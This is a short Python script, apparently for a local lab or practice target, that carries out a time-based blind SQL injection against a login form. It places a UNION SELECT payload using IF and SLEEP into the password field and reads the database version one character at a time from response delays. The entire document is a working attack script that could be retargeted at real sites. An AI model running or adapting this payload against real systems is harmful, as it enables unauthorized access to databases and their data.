import requests
import time
from threading import Thread

url = "http://localhost/login.php"
proxies = {
    'http': '127.0.0.1:8080'
}
data = {
    "username": "john",
    "password": "john"
}
iterator = 1

def send_request(i):
    global iterator, char_exists

    login_form = requests.get(url, proxies=proxies)
    phpsessid = login_form.cookies.get("PHPSESSID")
    char_exists = False

    data["password"] = "' UNION SELECT IF(ASCII(SUBSTRING(VERSION(), " + str(iterator) + ", 1)) = " + str(i) + ", SLEEP(2), 1), null, null, null-- "
    # print(data["password"])

    start_time = time.time()
    response = requests.post(url, data=data, proxies=proxies, cookies={"PHPSESSID": phpsessid})
    end_time = time.time()
    response_time = end_time - start_time
    # print(response_time)

    if response_time > 2:
        print(chr(i), end="")
        iterator += 1
        char_exists = True

    return char_exists

while True:
    char_exists = False
    for i in range(32, 127):
        thread = Thread(target=send_request, args=(i,))
        thread.start()
        thread.join()
        if char_exists:
            break

    if not char_exists:
        break